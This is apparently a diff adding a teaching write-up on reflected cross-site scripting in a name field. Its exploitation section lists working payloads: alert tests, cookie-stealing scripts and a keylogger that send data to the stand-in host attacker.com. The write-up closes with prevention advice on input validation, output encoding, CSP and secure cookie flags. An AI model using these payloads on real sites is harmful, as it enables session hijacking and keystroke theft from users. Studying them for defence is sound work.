@@ -1,0 +1,101 @@
+# 🔄 Reflected XSS (Non-Persistent)
+
+## 🎯 Target Application
+Name input field that echoes back user input without sanitization.
+
+## 📋 Vulnerability Description
+Reflected XSS occurs when user input is immediately returned in the server's response. The attack is typically delivered via a malicious link.
+
+## ⚡ Exploitation Steps
+
+### Step 1: Basic Proof of Concept
+
+Input: <script>alert('XSS')</script>
+Result: Alert box appears
+
+
+### Step 2: Steal Session Cookies
+```html
+<script>
+    // Send cookies to attacker server
+    document.location='http://attacker.com/steal?c='+document.cookie;
+</script>
+
+<script>
+    // Capture all keystrokes
+    document.onkeypress = function(e) {
+        var key = String.fromCharCode(e.keyCode);
+        var img = new Image();
+        img.src = 'http://attacker.com/log?key=' + key;
+    };
+</script>
+
+
+Payload Examples
+
+
+Basic Alert Payloads
+
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+
+
+Cookie Stealing Payloads
+
+<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+<img src=x onerror="this.src='http://attacker.com/steal?cookie='+document.cookie">
+<iframe src="javascript:document.write('<script>document.location=\"http://attacker.com/steal?cookie=\"+document.cookie</script>')"></iframe>
+
+
+Prevention Techniques
+
+
+1. Input Validation
+
+// Allow only alphanumeric characters
+if (!preg_match('/^[a-zA-Z0-9\s]+$/', $name)) {
+    die('Invalid input');
+}
+
+// Maximum length restriction
+if (strlen($name) > 50) {
+    die('Input too long');
+}
+
+
+2. Output Encoding
+
+// HTML Entity Encoding
+echo "Hello " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
+
+// For JavaScript contexts
+echo "<script>var name = " . json_encode($name) . ";</script>";
+
+// For URL contexts
+echo "<a href='/profile?name=" . urlencode($name) . "'>Profile</a>";
+
+
+3. Content Security Policy (CSP)
+
+<!-- Block inline scripts and external resources -->
+<meta http-equiv="Content-Security-Policy" 
+      content="default-src 'self'; 
+               script-src 'self'; 
+               object-src 'none';
+               style-src 'self'">
+
+
+4. Secure Cookie Attributes
+
+// HTTP-only and Secure cookies
+session_set_cookie_params([
+    'lifetime' => 0,
+    'path' => '/',
+    'domain' => $_SERVER['HTTP_HOST'],
+    'secure' => true,     // HTTPS only
+    'httponly' => true,   // No JavaScript access
+    'samesite' => 'Strict' // Prevent CSRF
+]);
+
